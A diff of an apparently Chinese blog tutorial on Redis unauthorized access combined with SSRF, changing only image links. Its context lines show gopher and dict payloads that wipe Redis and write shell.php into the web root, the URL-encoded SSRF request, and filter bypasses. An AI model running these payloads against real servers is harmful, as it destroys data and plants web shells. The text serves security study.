@@ -388,7 +388,7 @@ OK
 OK
 139.xxx.xx.xxx:6379&gt; save
 OK</code></pre>
-<p><strong>访问shell.php</strong><br><img src="https://img2020.cnblogs.com/blog/2022894/202004/2022894-20200428133125813-778417270.png"></p>
+<p><strong>访问shell.php</strong><br><img src="%E6%B5%85%E8%B0%88Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/screenshot.png" alt="screenshot"></p>
 <h2 id="Redis未授权漏洞与SSRF的综合利用"><a href="#Redis未授权漏洞与SSRF的综合利用" class="headerlink" title="Redis未授权漏洞与SSRF的综合利用"></a>Redis未授权漏洞与SSRF的综合利用</h2><h3 id="了解SSRF"><a href="#了解SSRF" class="headerlink" title="了解SSRF"></a>了解SSRF</h3><p>SSRF(Server-Side Request Forgery服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因是由服务端发起的，所以能够请求到与其相连而与外网隔离的内部系统)</p>
 <p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容或加载指定地址的图片</p>
 <p><strong>常见格式</strong></p>
@@ -419,7 +419,10 @@ xxx.xxx.xx.xxx:6379&gt; del name
 (integer) 1
 xxx.xxx.xx.xxx:6379&gt; get name
 (nil)</code></pre>
-<p><strong>所抓流量包</strong><br><img src="https://img2020.cnblogs.com/blog/2022894/202004/2022894-20200428133148903-868723733.png"><br><img src="https://img2020.cnblogs.com/blog/2022894/202004/2022894-20200428133207479-1979421042.png"><br><strong>分析流量包</strong></p>
+<p><strong>所抓流量包</strong></p>
+<p><img src="%E6%B5%85%E8%B0%88Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/screenshot%203.png" alt="screenshot 3"></p>
+<p><img src="%E6%B5%85%E8%B0%88Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/screenshot%204.png" alt="screenshot 4"></p>
+<p><strong>分析流量包</strong></p>
 <p>*3代表数组中数据个数为3（可以简单理解为空格为将命令分割为数组[“set”,”name”,”test”]）；$3代表字符串的长度，Hex中0d0a即\r\n表示结束符；+OK表示服务端执行成功后返回的字符串；$-1表示空值</p>
 <h3 id="SSRF漏洞相关函数和协议"><a href="#SSRF漏洞相关函数和协议" class="headerlink" title="SSRF漏洞相关函数和协议"></a>SSRF漏洞相关函数和协议</h3><p>以下函数使用不当会导致SSRF:</p>
 <ul>
@@ -563,7 +566,7 @@ print(&quot;gopher://127.0.0.1:6379/_&quot; + s.replace(&quot;$&quot;, &quot;%24
 <pre><code>curl -v &quot;gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2413%0d%0a/var/www/html%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%249%0d%0ashell.php%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%243%0d%0aweb%0d%0a%2418%0d%0a%3c%3fphp phpinfo()%3b%3f%3e%0d%0a*1%0d%0a%244%0d%0asave%0d%0a&quot;</code></pre>
 <p><strong>urlencode之后构造payload</strong></p>
 <pre><code>http://139.xxx.xx.xxx/index.php?url=gopher%3a%2f%2f127.0.0.1%3a6379%2f_*1%250d%250a%25248%250d%250aflushall%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%25243%250d%250adir%250d%250a%252413%250d%250a%2fvar%2fwww%2fhtml%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%252410%250d%250adbfilename%250d%250a%25249%250d%250ashell.php%250d%250a*3%250d%250a%25243%250d%250aset%250d%250a%25243%250d%250aweb%250d%250a%252418%250d%250a%253c%253fphp+phpinfo()%253b%253f%253e%250d%250a*1%250d%250a%25244%250d%250asave%250d%250a</code></pre>
-<p><strong>木马植入成功</strong><br><img src="https://img2020.cnblogs.com/blog/2022894/202004/2022894-20200428133323343-1348971075.png"></p>
+<p><strong>木马植入成功</strong><br><img src="%E6%B5%85%E8%B0%88Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/screenshot%201.png" alt="screenshot 1"></p>
 <h3 id="SSRF漏洞相关绕过"><a href="#SSRF漏洞相关绕过" class="headerlink" title="SSRF漏洞相关绕过"></a>SSRF漏洞相关绕过</h3><ul>
 <li><p><strong>@</strong></p>
 <pre><code>http://abc@127.0.0.1</code></pre>
@@ -581,7 +584,7 @@ print(&quot;gopher://127.0.0.1:6379/_&quot; + s.replace(&quot;$&quot;, &quot;%24
 <p>在Ubuntu和CentOS靶机中测试以及进行真实渗透时出现一些奇怪现象，尝试在<code>?url=</code>后面拼接<code>gopher payload</code>时一直无法成功，于是尝试<code>dict</code>协议执行Redis命令的方式去写入一句话竟然成功了</p>
 <pre><code>dict://127.0.0.1/set x &#39;&lt;?php phpinfo();?&gt;&#39;</code></pre>
 <p>发现目标服务器中php版本为V</p>
-<p><img src="https://img2020.cnblogs.com/blog/2022894/202004/2022894-20200428162852406-617192993.png"></p>
+<p><img src="%E6%B5%85%E8%B0%88Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/screenshot%202.png" alt="screenshot 2"></p>
 <p>而靶机中版本为php7，用<code>dict</code>协议写入时会出现如下错误</p>
 <pre><code>-ERR Protocol error: unbalanced quotes in request </code></pre>
 
